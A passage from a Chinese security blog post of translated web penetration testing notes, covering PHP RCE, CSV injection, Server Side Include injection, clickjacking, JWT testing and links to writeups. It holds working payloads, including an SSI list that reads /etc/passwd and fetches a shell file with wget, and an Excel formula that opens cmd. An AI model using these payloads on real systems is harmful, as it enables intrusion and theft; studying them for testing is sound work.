<h2 id="PHP中的匿名函数RCE"><a href="#PHP中的匿名函数RCE" class="headerlink" title="PHP中的匿名函数RCE"></a>PHP中的匿名函数RCE</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$inputFunc = function() use($a, $b, $c, &amp;$f)&#123;echo(exec(&apos;whoami&apos;));&#125;;</span><br></pre></td></tr></table></figure>

<h2 id="PHP实验"><a href="#PHP实验" class="headerlink" title="PHP实验"></a>PHP实验</h2><p>如果您需要测试一些PHP代码，可以使用本机Web服务器来托管它：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">php -S 127.0.0.1:80 -t .</span><br></pre></td></tr></table></figure>

<h2 id="PHP交互式SHELL"><a href="#PHP交互式SHELL" class="headerlink" title="PHP交互式SHELL"></a>PHP交互式SHELL</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">php -a</span><br></pre></td></tr></table></figure>

<h2 id="CSV注入"><a href="#CSV注入" class="headerlink" title="CSV注入"></a>CSV注入</h2><p>在Windows上的Excel中，输入以下内容以获取cmd shell：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">=cmd|&apos;cmd&apos;!&apos;&apos;</span><br></pre></td></tr></table></figure>

<p>exmaple:<a href="https://rhinosecuritylabs.com/azure/cloud-security-risks-part-1-azure-csv-injection-vulnerability/" target="_blank" rel="noopener">https://rhinosecuritylabs.com/azure/cloud-security-risks-part-1-azure-csv-injection-vulnerability/</a></p>
<p>movie：<a href="https://www.youtube.com/watch?v=SC7AkclnG2g" target="_blank" rel="noopener">https://www.youtube.com/watch?v=SC7AkclnG2g</a></p>
<h2 id="有用的脚本"><a href="#有用的脚本" class="headerlink" title="有用的脚本"></a>有用的脚本</h2><p>不断检查网站服务是否关闭：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">while true; do /usr/bin/wget &quot;http://[target]/uri/path&quot; --timeout 30 -O - 2&gt;/dev/null | grep &quot;[item on page]&quot; || echo &quot;The site is down&quot;; sleep 10; done</span><br></pre></td></tr></table></figure>

<h2 id="IDORS"><a href="#IDORS" class="headerlink" title="IDORS"></a>IDORS</h2><p><a href="https://www.bugcrowd.com/how-to-find-idor-insecure-direct-object-reference-vulnerabilities-for-large-bounty-rewards/" target="_blank" rel="noopener">https://www.bugcrowd.com/how-to-find-idor-insecure-direct-object-reference-vulnerabilities-for-large-bounty-rewards/</a></p>
<h2 id="服务器端包含注入"><a href="#服务器端包含注入" class="headerlink" title="服务器端包含注入"></a>服务器端包含注入</h2><p>把它放在一个易受攻击的参数中：<br>如果有效，您应该在响应中看到当前日期和时间输出。</p>
<p><code>&lt;!--#printenv --&gt;</code>：输出环境变量。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;!--#exec cmd=&quot;cat /etc/passwd&quot;--&gt;</span><br></pre></td></tr></table></figure>

<p>more:</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br></pre></td><td class="code"><pre><span class="line">&lt;pre&gt;&lt;!--#exec cmd=&quot;ls&quot; --&gt;&lt;/pre&gt;</span><br><span class="line">&lt;pre&gt;&lt;!--#echo var=&quot;DATE_LOCAL&quot; --&gt; &lt;/pre&gt;</span><br><span class="line">&lt;pre&gt;&lt;!--#exec cmd=&quot;whoami&quot;--&gt;&lt;/pre&gt;</span><br><span class="line">&lt;pre&gt;&lt;!--#exec cmd=&quot;dir&quot; --&gt;&lt;/pre&gt;</span><br><span class="line">&lt;!--#exec cmd=&quot;ls&quot; --&gt;</span><br><span class="line">&lt;!--#exec cmd=&quot;wget http://website.com/dir/shell.txt&quot; --&gt;</span><br><span class="line">&lt;!--#exec cmd=&quot;/bin/ls /&quot; --&gt;</span><br><span class="line">&lt;!--#exec cmd=&quot;dir&quot; --&gt;</span><br><span class="line">&lt;!--#exec cmd=&quot;cd C:\WINDOWS\System32&quot;&gt;</span><br><span class="line">&lt;!--#config errmsg=&quot;File not found, informs users and password&quot;--&gt;</span><br><span class="line">&lt;!--#echo var=&quot;DOCUMENT_NAME&quot; --&gt;</span><br><span class="line">&lt;!--#echo var=&quot;DOCUMENT_URI&quot; --&gt;</span><br><span class="line">&lt;!--#config timefmt=&quot;A %B %d %Y %r&quot;--&gt;</span><br><span class="line">&lt;!--#fsize file=&quot;ssi.shtml&quot; --&gt;</span><br><span class="line">&lt;!--#include file=?UUUUUUUU...UU?--&gt;</span><br><span class="line">&lt;!--#echo var=&quot;DATE_LOCAL&quot; --&gt;</span><br><span class="line">&lt;!--#exec cmd=&quot;whoami&quot;--&gt;</span><br><span class="line">&lt;!--#printenv --&gt;</span><br><span class="line">&lt;!--#flastmod virtual=&quot;echo.html&quot; --&gt;</span><br><span class="line">&lt;!--#echo var=&quot;auth_type&quot; --&gt;</span><br><span class="line">&lt;!--#echo var=&quot;http_referer&quot; --&gt;</span><br><span class="line">&lt;!--#echo var=&quot;content_length&quot; --&gt;</span><br><span class="line">&lt;!--#echo var=&quot;content_type&quot; --&gt;</span><br><span class="line">&lt;!--#echo var=&quot;http_accept_encoding&quot; --&gt;</span><br><span class="line">&lt;!--#echo var=&quot;forwarded&quot; --&gt;</span><br><span class="line">&lt;!--#echo var=&quot;document_uri&quot; --&gt;</span><br><span class="line">&lt;!--#echo var=&quot;date_gmt&quot; --&gt;</span><br><span class="line">&lt;!--#echo var=&quot;date_local&quot; --&gt;</span><br><span class="line">&lt;!--#echo var=&quot;document_name&quot; --&gt;</span><br><span class="line">&lt;!--#echo var=&quot;document_root&quot; --&gt;</span><br><span class="line">&lt;!--#echo var=&quot;from&quot; --&gt;</span><br><span class="line">&lt;!--#echo var=&quot;gateway_interface&quot; --&gt;</span><br><span class="line">&lt;!--#echo var=&quot;http_accept&quot; --&gt;</span><br><span class="line">&lt;!--#echo var=&quot;http_accept_charset&quot; --&gt;</span><br><span class="line">&lt;!--#echo var=&quot;http_accept_language&quot; --&gt;</span><br><span class="line">&lt;!--#echo var=&quot;http_connection&quot; --&gt;</span><br><span class="line">&lt;!--#echo var=&quot;http_cookie&quot; --&gt;</span><br><span class="line">&lt;!--#echo var=&quot;http_form&quot; --&gt;</span><br><span class="line">&lt;!--#echo var=&quot;http_host&quot; --&gt;</span><br><span class="line">&lt;!--#echo var=&quot;user_name&quot; --&gt;</span><br><span class="line">&lt;!--#echo var=&quot;unique_id&quot; --&gt;</span><br><span class="line">&lt;!--#echo var=&quot;tz&quot; --&gt;</span><br><span class="line">&lt;!--#echo var=&quot;total_hits&quot; --&gt;</span><br><span class="line">&lt;!--#echo var=&quot;server_software&quot; --&gt;</span><br><span class="line">&lt;!--#echo var=&quot;server_protocol&quot; --&gt;</span><br><span class="line">&lt;!--#echo var=&quot;server_port&quot; --&gt;</span><br><span class="line">&lt;!--#echo var=&quot;server_name --&gt;</span><br><span class="line">&lt;!--#echo var=&quot;server_addr&quot; --&gt;</span><br><span class="line">&lt;!--#echo var=&quot;server_admin&quot; --&gt;</span><br><span class="line">&lt;!--#echo var=&quot;script_url&quot; --&gt;</span><br><span class="line">&lt;!--#echo var=&quot;script_uri&quot; --&gt;</span><br><span class="line">&lt;!--#echo var=&quot;script_name&quot; --&gt;</span><br><span class="line">&lt;!--#echo var=&quot;script_filename&quot; --&gt;</span><br><span class="line">&lt;!--#echo var=&quot;netsite_root&quot; --&gt;</span><br><span class="line">&lt;!--#echo var=&quot;site_htmlroot&quot; --&gt;</span><br><span class="line">&lt;!--#echo var=&quot;path_translated&quot; --&gt;</span><br><span class="line">&lt;!--#echo var=&quot;path_info_translated&quot; --&gt;</span><br><span class="line">&lt;!--#echo var=&quot;request_uri&quot; --&gt;</span><br><span class="line">&lt;!--#echo var=&quot;request_method&quot; --&gt;</span><br><span class="line">&lt;!--#echo var=&quot;remote_user&quot; --&gt;</span><br><span class="line">&lt;!--#echo var=&quot;remote_addr&quot; --&gt;</span><br><span class="line">&lt;!--#echo var=&quot;http_client_ip&quot; --&gt;</span><br><span class="line">&lt;!--#echo var=&quot;remote_port&quot; --&gt;</span><br><span class="line">&lt;!--#echo var=&quot;remote_ident&quot; --&gt;</span><br><span class="line">&lt;!--#echo var=&quot;remote_host&quot; --&gt;</span><br><span class="line">&lt;!--#echo var=&quot;query_string_unescaped&quot; --&gt;</span><br><span class="line">&lt;!--#echo var=&quot;query_string&quot; --&gt;</span><br><span class="line">&lt;!--#echo var=&quot;path_translated&quot; --&gt;</span><br><span class="line">&lt;!--#echo var=&quot;path_info&quot; --&gt;</span><br><span class="line">&lt;!--#echo var=&quot;path&quot; --&gt;</span><br><span class="line">&lt;!--#echo var=&quot;page_count&quot; --&gt;</span><br><span class="line">&lt;!--#echo var=&quot;last_modified&quot; --&gt;</span><br><span class="line">&lt;!--#echo var=&quot;http_user_agent&quot; --&gt;</span><br><span class="line">&lt;!--#echo var=&quot;http_ua_os&quot; --&gt;</span><br><span class="line">&lt;!--#echo var=&quot;http_ua_cpu&quot; --&gt;</span><br></pre></td></tr></table></figure>

<h2 id="点击劫持"><a href="#点击劫持" class="headerlink" title="点击劫持"></a>点击劫持</h2><p>只需使用Burp的clickbandit。还要记住：Clickjacking适用于点击，而不适用于键盘。</p>
<p>poc:</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">&lt;html&gt;</span><br><span class="line">   &lt;head&gt;</span><br><span class="line">     &lt;title&gt;Clickjack test page&lt;/title&gt;</span><br><span class="line">   &lt;/head&gt;</span><br><span class="line">   &lt;body&gt;</span><br><span class="line">     &lt;p&gt;Website is vulnerable to clickjacking!&lt;/p&gt;</span><br><span class="line">     &lt;iframe src=&quot;http://target.com&quot; width=&quot;500&quot; height=&quot;500&quot;&gt;&lt;/iframe&gt;</span><br><span class="line">   &lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure>

<p><a href="https://www.owasp.org/index.php/Testing_for_Clickjacking_(OTG-CLIENT-009" target="_blank" rel="noopener">https://www.owasp.org/index.php/Testing_for_Clickjacking_(OTG-CLIENT-009</a>)<br><a href="https://javascript.info/clickjacking" target="_blank" rel="noopener">https://javascript.info/clickjacking</a><br><a href="https://www.tinfoilsecurity.com/blog/what-is-clickjacking" target="_blank" rel="noopener">https://www.tinfoilsecurity.com/blog/what-is-clickjacking</a></p>
<h2 id="攻击JSON"><a href="#攻击JSON" class="headerlink" title="攻击JSON"></a>攻击JSON</h2><p>利用burp标记参数进行主动扫描</p>
<p><a href="https://www.coalfire.com/Solutions/Coalfire-Labs/The-Coalfire-LABS-Blog/may-2018/the-right-way-to-test-json-parameters-with-burp" target="_blank" rel="noopener">https://www.coalfire.com/Solutions/Coalfire-Labs/The-Coalfire-LABS-Blog/may-2018/the-right-way-to-test-json-parameters-with-burp</a></p>
<h2 id="反序列化漏洞"><a href="#反序列化漏洞" class="headerlink" title="反序列化漏洞"></a>反序列化漏洞</h2><p><a href="https://www.nc-lp.com/blog/weaponize-oracle-weblogic-server-poc-cve-2018-2628" target="_blank" rel="noopener">Writeup on Oracle Weblogic CVE-2018-2628</a><br><a href="https://portswigger.net/bappstore/228336544ebe4e68824b5146dbbd93ae" target="_blank" rel="noopener">Java Deserialization Scanner Burp Extension</a><br><a href="https://portswigger.net/bappstore/bc737909a5d742eab91544705c14d34f" target="_blank" rel="noopener">Java Serialized Payloads Burp Extension</a></p>
<h3 id="工具"><a href="#工具" class="headerlink" title="工具"></a>工具</h3><p><a href="https://github.com/summitt/burp-ysoserial/releases" target="_blank" rel="noopener">Ysoserial</a></p>
<h2 id="测试不安全的JWT"><a href="#测试不安全的JWT" class="headerlink" title="测试不安全的JWT"></a>测试不安全的JWT</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">获取JSON Web Tokens Burp扩展</span><br><span class="line">捕获请求，将其发送到Repeater</span><br><span class="line">单击JSON Web Tokens选项卡</span><br><span class="line">单击使用随机密钥对签名</span><br><span class="line">单击Alg None Attack下的下拉菜单</span><br><span class="line">单击Go</span><br><span class="line">查看会话后是否仍然有效</span><br></pre></td></tr></table></figure>

<h2 id="LFI"><a href="#LFI" class="headerlink" title="LFI"></a>LFI</h2><p><a href="https://hack-ed.net/2017/11/05/finally-a-bug-bounty-write-up-lfi/" target="_blank" rel="noopener">https://hack-ed.net/2017/11/05/finally-a-bug-bounty-write-up-lfi/</a></p>
<h2 id="子域名探测技术"><a href="#子域名探测技术" class="headerlink" title="子域名探测技术"></a>子域名探测技术</h2><p><a href="https://0xpatrik.com/subdomain-takeover-starbucks/" target="_blank" rel="noopener">https://0xpatrik.com/subdomain-takeover-starbucks/</a></p>
<p>原文地址：<a href="https://techvomit.net/web-application-penetration-testing-notes/" target="_blank" rel="noopener">https://techvomit.net/web-application-penetration-testing-notes/</a></p>

    </div>

    
    
    

    <div>
    
    <div>
    
        <div style="text-align:center;color: #ccc;font-size:14px;">-------------本文结束<i class="fa fa-paw"></i>感谢您的阅读-------------</div>
    
</div>

    
    </div>
      <div>
        

<ul class="post-copyright">
  <li class="post-copyright-author">
    <strong>本文作者： </strong>Wh0ale</li>
  <li class="post-copyright-link">
    <strong>本文链接：</strong>
    <a href="https://wh0ale.github.io/2018/12/18/2018-12-18-Web fuzzing/" title="Web Fuzzing">https://wh0ale.github.io/2018/12/18/2018-12-18-Web fuzzing/</a>
  </li>
  <li class="post-copyright-license">
    <strong>版权声明： </strong>本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/zh-Hans" rel="noopener" target="_blank"><i class="fa fa-fw fa-creative-commons"></i>BY-NC-SA</a> 许可协议。转载请注明出处！</li>
</ul>

      </div>

    <footer class="post-footer">
          
        
        <div class="post-tags">
            <a href="/tags/fuzz/" rel="tag"><i class="fa fa-tag"></i># fuzz</a>
          
        </div>
        <div class="post-nav">
          <div class="post-nav-next post-nav-item">
              <a href="/2018/12/18/2018-12-18-C2通信/" rel="next" title="imaginaryC2 - 旨在帮助恶意软件的行为（网络）分析的工具">
                <i class="fa fa-chevron-left"></i> imaginaryC2 - 旨在帮助恶意软件的行为（网络）分析的工具
              </a>
            
          </div>

          <span class="post-nav-divider"></span>

          <div class="post-nav-prev post-nav-item">
              <a href="/2018/12/19/2018-12-19-域渗透/" rel="prev" title="域渗透总结">
                域渗透总结 <i class="fa fa-chevron-right"></i>
              </a>
            
          </div>
        </div>
    </footer>
  </div>
  
  
  
  </article>

  </div>


          </div>
          
    
    <div class="comments" id="gitalk-container"></div>
  


        </div>
          
  
  <div class="sidebar-toggle">
    <div class="sidebar-toggle-line-wrap">
      <span class="sidebar-toggle-line sidebar-toggle-line-first"></span>
      <span class="sidebar-toggle-line sidebar-toggle-line-middle"></span>
      <span class="sidebar-toggle-line sidebar-toggle-line-last"></span>
    </div>
  </div>

  <aside id="sidebar" class="sidebar">
    <div class="sidebar-inner">
        <ul class="sidebar-nav motion-element">
          <li class="sidebar-nav-toc sidebar-nav-active" data-target="post-toc-wrap">
            文章目录
          </li>
          <li class="sidebar-nav-overview" data-target="site-overview-wrap">
            站点概览
          </li>
        </ul>
      

      <div class="site-overview-wrap sidebar-panel">
        <div class="site-overview">

          <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
    <img class="site-author-image" itemprop="image"
      src="/images/avatar.gif"
      alt="Wh0ale">
  <p class="site-author-name" itemprop="name">Wh0ale</p>
  <div class="site-description motion-element" itemprop="description">No master and rookie，only hardworking and lazy.</div>
</div>
  <nav class="site-state motion-element">
      <div class="site-state-item site-state-posts">
        
          <a href="/archives/">
        
          <span class="site-state-item-count">125</span>
          <span class="site-state-item-name">日志</span>
        </a>
      </div>
    
      
      
      <div class="site-state-item site-state-categories">
        
          
            <a href="/categories/">
          
        
        
        
          
        
          
        
          
        
          
        
        <span class="site-state-item-count">3</span>
        <span class="site-state-item-name">分类</span>
        </a>
      </div>
    
      
      
      <div class="site-state-item site-state-tags">
        
          
            <a href="/tags/">
          
        
        
        
          
        
          
        
          
        
          
        
          
        
          
        
          
        
          
        
          
        
          
        
          
        
          
        
          
        
          
        
          
        
          
        
          
        
          
        
          
        
          
        
          
        
          
        
          
        
          
        
          
        
          
        
          
        
          
        
          
        
          
        
          
        
          
        
          
        
          
        
          
        
          
        
          
        
          
        
          
        
          
        
          
        
          
        
          
        
          
        
          
        
          
        
          
        
          
        
          
        
          
        
          
        
          
        
          
        
          
        
          
        
          
        
          
        
          
        
          
        
          
        
        <span class="site-state-item-count">60</span>
        <span class="site-state-item-name">标签</span>
        </a>
      </div>
    
  </nav>
  <div class="feed-link motion-element">
    <a href="/atom.xml" rel="alternate">
      <i class="fa fa-rss"></i>RSS
    </a>
  </div>
  <div class="links-of-author motion-element">
      <span class="links-of-author-item">
      
      
        
      
      
        
      
        <a href="https://github.com/Wh0ale" title="GitHub &rarr; https://github.com/Wh0ale" rel="noopener" target="_blank"><i class="fa fa-fw fa-github"></i>GitHub</a>
      </span>
    
      <span class="links-of-author-item">
      
      
        
      
      
        
      
        <a href="https://medium.com/@Wh0ale" title="Medium &rarr; https://medium.com/@Wh0ale" rel="noopener" target="_blank"><i class="fa fa-fw fa-medium"></i>Medium</a>
      </span>
    
      <span class="links-of-author-item">
      
      
        
      
      
        
      
        <a href="/AttackerWh0ale@gmail.com" title="Mail &rarr; AttackerWh0ale@gmail.com"><i class="fa fa-fw fa-envelope"></i>Mail</a>
      </span>
    
      <span class="links-of-author-item">
      
      
        
      
      
        
      
        <a href="https://twitter.com/Wh0ale" title="Twitter &rarr; https://twitter.com/Wh0ale" rel="noopener" target="_blank"><i class="fa fa-fw fa-twitter"></i>Twitter</a>
      </span>
    
  </div>
  <div class="cc-license motion-element" itemprop="license">
    
  
    <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/zh-Hans" class="cc-opacity" rel="noopener" target="_blank"><img src="/images/cc-by-nc-sa.svg" alt="Creative Commons"></a>
  </div>



        </div>
      </div>
      <!--noindex-->
        <div class="post-toc-wrap motion-element sidebar-panel sidebar-panel-active">
          <div class="post-toc">

            
            
            
            

            
              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#Web-Fuzz"><span class="nav-number">1.</span> <span class="nav-text">Web Fuzz</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#XXE"><span class="nav-number">1.1.</span> <span class="nav-text">XXE</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#测试方法"><span class="nav-number">1.1.1.</span> <span class="nav-text">测试方法</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#webgoat8"><span class="nav-number">1.2.</span> <span class="nav-text">webgoat8</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#测试方法-1"><span class="nav-number">1.2.1.</span> <span class="nav-text">测试方法</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#MUTILLIDAE"><span class="nav-number">1.3.</span> <span class="nav-text">MUTILLIDAE</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#OUT-OF-BAND"><span class="nav-number">1.4.</span> <span class="nav-text">OUT OF BAND</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#基础测试"><span class="nav-number">1.4.1.</span> <span class="nav-text">基础测试</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#读文件"><span class="nav-number">1.4.2.</span> <span class="nav-text">读文件</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#使用FTP读文件"><span class="nav-number">1.4.3.</span> <span class="nav-text">使用FTP读文件</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#XSS"><span class="nav-number">1.5.</span> <span class="nav-text">XSS</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#文件上传的XSS"><span class="nav-number">1.5.1.</span> <span class="nav-text">文件上传的XSS</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#SVG"><span class="nav-number">1.5.2.</span> <span class="nav-text">SVG</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#XML"><span class="nav-number">1.5.3.</span> <span class="nav-text">XML</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#CSP-BYPASS"><span class="nav-number">1.5.4.</span> <span class="nav-text">CSP BYPASS</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#常用的payload"><span class="nav-number">1.5.5.</span> <span class="nav-text">常用的payload</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#AUTH-CRED"><span class="nav-number">1.5.6.</span> <span class="nav-text">AUTH CRED</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#偷Cookie"><span class="nav-number">1.5.7.</span> <span class="nav-text">偷Cookie</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#测试session劫持"><span class="nav-number">1.5.8.</span> <span class="nav-text">测试session劫持</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#FILTER-BYPASS-RESOURCES"><span class="nav-number">1.5.9.</span> <span class="nav-text">FILTER BYPASS RESOURCES</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#基于POST的XSS"><span class="nav-number">1.5.10.</span> <span class="nav-text">基于POST的XSS</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#DOM-XSS"><span class="nav-number">1.5.11.</span> <span class="nav-text">DOM XSS</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#SSRF"><span class="nav-number">1.6.</span> <span class="nav-text">SSRF</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#SQL注入"><span class="nav-number">1.7.</span> <span class="nav-text">SQL注入</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#会话固定"><span class="nav-number">1.8.</span> <span class="nav-text">会话固定</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#CSRF"><span class="nav-number">1.9.</span> <span class="nav-text">CSRF</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#文件上传漏洞"><span class="nav-number">1.10.</span> <span class="nav-text">文件上传漏洞</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#无限制的文件上传"><span class="nav-number">1.10.1.</span> <span class="nav-text">无限制的文件上传</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#CORS配置错误"><span class="nav-number">1.10.2.</span> <span class="nav-text">CORS配置错误</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#测试心脏出血漏洞"><span class="nav-number">1.11.</span> <span class="nav-text">测试心脏出血漏洞</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#偷私钥"><span class="nav-number">1.11.1.</span> <span class="nav-text">偷私钥</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#重定向"><span class="nav-number">1.12.</span> <span class="nav-text">重定向</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#CRLF注入"><span class="nav-number">1.13.</span> <span class="nav-text">CRLF注入</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#模板注入"><span class="nav-number">1.14.</span> <span class="nav-text">模板注入</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#RCE"><span class="nav-number">1.15.</span> <span class="nav-text">RCE</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#PHP中的匿名函数RCE"><span class="nav-number">1.16.</span> <span class="nav-text">PHP中的匿名函数RCE</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#PHP实验"><span class="nav-number">1.17.</span> <span class="nav-text">PHP实验</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#PHP交互式SHELL"><span class="nav-number">1.18.</span> <span class="nav-text">PHP交互式SHELL</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#CSV注入"><span class="nav-number">1.19.</span> <span class="nav-text">CSV注入</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#有用的脚本"><span class="nav-number">1.20.</span> <span class="nav-text">有用的脚本</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#IDORS"><span class="nav-number">1.21.</span> <span class="nav-text">IDORS</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#服务器端包含注入"><span class="nav-number">1.22.</span> <span class="nav-text">服务器端包含注入</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#点击劫持"><span class="nav-number">1.23.</span> <span class="nav-text">点击劫持</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#攻击JSON"><span class="nav-number">1.24.</span> <span class="nav-text">攻击JSON</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#反序列化漏洞"><span class="nav-number">1.25.</span> <span class="nav-text">反序列化漏洞</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#工具"><span class="nav-number">1.25.1.</span> <span class="nav-text">工具</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#测试不安全的JWT"><span class="nav-number">1.26.</span> <span class="nav-text">测试不安全的JWT</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#LFI"><span class="nav-number">1.27.</span> <span class="nav-text">LFI</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#子域名探测技术"><span class="nav-number">1.28.</span> <span class="nav-text">子域名探测技术</span></a></li></ol></li></ol></div>
            

          </div>
        </div>
      <!--/noindex-->
      
        <div class="back-to-top motion-element">
          <i class="fa fa-arrow-up"></i>
          
            <span id="scrollpercent"><span>0</span>%</span>
          
        </div>
      

    </div>
  </aside>
  <div id="sidebar-dimmer"></div>


      </div>
    </main>

    <footer id="footer" class="footer">
      <div class="footer-inner">
        <div class="copyright">&copy; <span itemprop="copyrightYear">2019</span>
  <span class="with-love" id="animate">
    <i class="fa fa-heart"></i>
  </span>
  <span class="author" itemprop="copyrightHolder">Wh0ale</span>
    <span class="post-meta-divider">|</span>
    <span class="post-meta-item-icon">
      <i class="fa fa-area-chart"></i>
    </span>
    <span title="站点总字数">1.5m</span>
    <span class="post-meta-divider">|</span>
    <span class="post-meta-item-icon">
      <i class="fa fa-coffee"></i>
    </span>
    <span title="站点阅读时长">22:33</span>
</div>

<div>
<span id="timeDate">载入天数...</span><span id="times">载入时分秒...</span>
<script>
    var now = new Date();
    function createtime() {
        var grt= new Date("03/31/2019 00:00:00");
        now.setTime(now.getTime()+250);
        days = (now - grt ) / 1000 / 60 / 60 / 24; dnum = Math.floor(days);
        hours = (now - grt ) / 1000 / 60 / 60 - (24 * dnum); hnum = Math.floor(hours);
        if(String(hnum).length ==1 ){hnum = "0" + hnum;} minutes = (now - grt ) / 1000 /60 - (24 * 60 * dnum) - (60 * hnum);
        mnum = Math.floor(minutes); if(String(mnum).length ==1 ){mnum = "0" + mnum;}
        seconds = (now - grt ) / 1000 - (24 * 60 * 60 * dnum) - (60 * 60 * hnum) - (60 * mnum);
        snum = Math.round(seconds); if(String(snum).length ==1 ){snum = "0" + snum;}
        document.getElementById("timeDate").innerHTML = "本站已安全运行 "+dnum+" 天 ";
        document.getElementById("times").innerHTML = hnum + " 小时 " + mnum + " 分 " + snum + " 秒";
    }
setInterval("createtime()",250);
</script>
</div>

        
<div class="busuanzi-count">
  <script async src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
    <span class="post-meta-item-icon">
      <i class="fa fa-user"></i>
    </span>
    <span class="site-uv" title="总访客量">
